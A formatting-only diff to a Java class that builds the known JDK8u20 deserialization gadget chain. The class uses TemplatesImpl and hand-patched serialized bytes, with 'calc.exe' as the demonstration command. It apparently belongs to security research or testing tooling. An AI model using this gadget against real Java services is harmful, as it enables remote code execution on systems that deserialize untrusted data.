@@ -1,4 +1,5 @@
 package me.n1ar4.fake.gadget;
+
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
 import javax.xml.transform.Templates;
@@ -13,14 +14,15 @@ import static java.io.ObjectStreamConstants.*;
 
 @SuppressWarnings("all")
 public class JDK8U20 {
-    public static void main(String[] args)throws Exception {
+    public static void main(String[] args) throws Exception {
         byte[] o = JDK8U20.getObject("calc.exe");
         SerUtil.deserializeObject(o);
     }
+
     public static byte[] getObject(String command) throws Exception {
         TemplatesImpl templates = null;
         try {
-            templates =  Gadgets.createTemplatesImpl1(command);
+            templates = Gadgets.createTemplatesImpl1(command);
             Reflections.setFieldValue(templates, "_auxClasses", null);
 
         } catch (Exception e) {
@@ -35,7 +37,7 @@ public class JDK8U20 {
 
     public static byte[] patch(byte[] bytes) {
         for (int i = 0; i < bytes.length; i++) {
-            if (bytes[i] == 0x71 && bytes[i+1] == 0x00 && bytes[i+2] == 0x7e && bytes[i+3] ==0x00) {
+            if (bytes[i] == 0x71 && bytes[i + 1] == 0x00 && bytes[i + 2] == 0x7e && bytes[i + 3] == 0x00) {
                 i = i + 4;
                 if (bytes[i] == 1) bytes[i] = 5;        // (String)
                 if (bytes[i] == 10) bytes[i] = 13;      // (ObjectStreamClass) [[B
